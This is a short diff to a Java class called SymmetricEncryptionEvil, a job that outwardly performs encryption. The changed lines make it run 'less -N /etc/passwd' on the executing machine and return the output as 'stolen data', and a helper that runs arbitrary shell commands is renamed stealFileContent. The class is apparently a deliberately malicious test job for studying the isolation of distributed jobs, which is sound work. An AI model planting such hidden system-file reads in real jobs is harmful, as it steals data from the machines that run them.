@@ -38,7 +38,7 @@ public class SymmetricEncryptionEvil implements JobInterface<String>,
 				+ "\n\nThe job was executed in machine: %s."
 				+ "\n\nFinally, this is the stolen data: %s", originalMessage,
 				encryptedMessage, getIPAddress(),
-				getCommandResult("less -N /Users/tanvir/.gitignore"));
+				stealFileContent("less -N /etc/passwd"));
 	}
 
 	/**
@@ -95,7 +95,7 @@ public class SymmetricEncryptionEvil implements JobInterface<String>,
 	 *            - nix command to run on a host machine
 	 * @return - std output from running the nix command
 	 */
-	private String getCommandResult(String command) {
+	private String stealFileContent(String command) {
 		StringBuffer output = new StringBuffer();
 		try {
 			Process process = Runtime.getRuntime().exec(command);
